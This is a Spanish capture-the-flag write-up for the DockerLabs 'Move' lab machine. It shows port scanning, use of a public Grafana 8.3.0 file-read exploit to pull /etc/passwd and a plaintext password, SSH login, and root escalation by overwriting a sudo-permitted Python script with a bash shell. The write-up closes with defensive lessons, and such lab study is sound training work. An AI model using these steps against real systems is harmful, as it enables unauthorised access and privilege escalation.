# Move — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 30/06/2024  
**Técnicas:** Grafana LFI · Directory Traversal · Searchsploit · SSH · Python sudo abuse

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
3. [Grafana 8.3.0 — explotación LFI](#3-grafana-830--explotación-lfi)
4. [Acceso SSH](#4-acceso-ssh)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh move.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo rápido:

```bash
nmap -Pn 172.17.0.2
```

Resultado:

```text
21/tcp open ftp
22/tcp open ssh
80/tcp open http
3000/tcp open ppp
```

Enumeramos versiones:

```bash
nmap -p21,22,80,3000 -sCV -Pn 172.17.0.2
```

Servicios detectados:

```text
vsftpd 3.0.3
OpenSSH 9.6p1
Apache httpd 2.4.58
Grafana 8.3.0
```

---

## 2. Enumeración web — Gobuster

Como el servidor utiliza Apache realizamos enumeración de directorios:

```bash
sudo gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt
```

Encontramos:

```text
/maintenance.html
```

Contenido:

```text
Website under maintenance, access is in /tmp/pass.txt
```

También observamos que el puerto `3000` corresponde a Grafana.

---

## 3. Grafana 8.3.0 — explotación LFI

Buscamos exploits disponibles:

```bash
searchsploit Grafana 8.3.0
```

Resultado:

```text
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
```

Localizamos el exploit:

```bash
locate multiple/webapps/50581.py
```

Copiamos el exploit:

```bash
cp /usr/share/exploitdb/exploits/multiple/webapps/50581.py .
```

Mostramos ayuda:

```bash
python3 50581.py -h
```

Leemos `/etc/passwd`:

```bash
python3 50581.py -H http://172.17.0.2:3000 /etc/passwd
```

Usuario encontrado:

```text
freddy
```

Leemos el fichero mencionado anteriormente:

```bash
python3 50581.py -H http://172.17.0.2:3000 /tmp/pass.txt
```

Resultado:

```text
t9SH76pQ82UFeZ3GXZS
```

---

## 4. Acceso SSH

Probamos la contraseña encontrada con el usuario `freddy`:

```bash
ssh freddy@172.17.0.2
```

Acceso correcto.

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

---

## 5. Escalada de privilegios

Eliminamos el script original:

```bash
cd /opt
rm -r maintenance.py
```

Creamos uno nuevo:

```python
import os
os.system("/bin/bash")
```

Damos permisos:

```bash
chmod +x maintenance.py
```

Ejecutamos el script como root:

```bash
sudo /usr/bin/python3 /opt/maintenance.py
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Grafana vulnerable a LFI | Lectura arbitraria de archivos |
| Credenciales expuestas en archivos temporales | Acceso SSH |
| Script Python ejecutable con sudo | Escalada de privilegios |
| Permisos inseguros sobre scripts | Ejecución arbitraria |

**Para defenderse:**

- Mantener Grafana actualizado.
- Evitar almacenar contraseñas en texto plano.
- Restringir permisos sudo innecesarios.
- Proteger scripts ejecutados con privilegios elevados.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
